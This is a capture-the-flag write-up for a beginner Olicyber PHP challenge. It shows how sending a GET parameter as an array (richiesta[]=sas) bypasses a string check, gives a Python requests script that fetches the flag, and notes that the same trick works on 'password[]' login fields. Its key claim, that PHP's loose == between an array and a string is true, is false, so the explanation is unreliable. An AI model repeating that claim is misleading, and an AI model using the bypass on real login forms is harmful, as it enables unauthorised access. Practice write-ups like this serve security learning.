---
title: "Make a Wish — PHP GET Array Type Coercion Bypass"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "php", "type-juggling", "python"]
difficulty: "beginner"
summary: "Pass the GET parameter as an array (?richiesta[]=sas) to make PHP receive an array instead of a string, bypassing the string equality check and revealing the flag."
---

## The Challenge

The page checks `$_GET['richiesta']` against a specific string with a loose comparison. If the check fails you get an error; if it passes you get the flag.

## Approach

Sending `richiesta[]=sas` makes PHP parse `$_GET['richiesta']` as an array `['sas']`. A loose `==` comparison between an array and a string evaluates to `true` in PHP — the condition passes and the flag is printed in a `<h1>` tag.

## Solution

```python
import requests
site = "http://make-a-wish.challs.olicyber.it/?richiesta[]=sas"
r = requests.get(site)
for i in r.text.split("\n"):
    if "flag" in i:
        print(i.replace("<h1>", "").replace("</h1>",""), end="")
        break
```

The `[]` suffix in a GET parameter is standard PHP array notation. The loop finds the `<h1>` line containing the flag and strips the HTML tags.

## What I Learned

PHP treats `param[]` as an array input in `$_GET` and `$_POST`. Any comparison that doesn't use `===` or `is_string()` before comparing is vulnerable to type juggling. The same trick that works for `password[]` in login forms works for any string GET parameter.
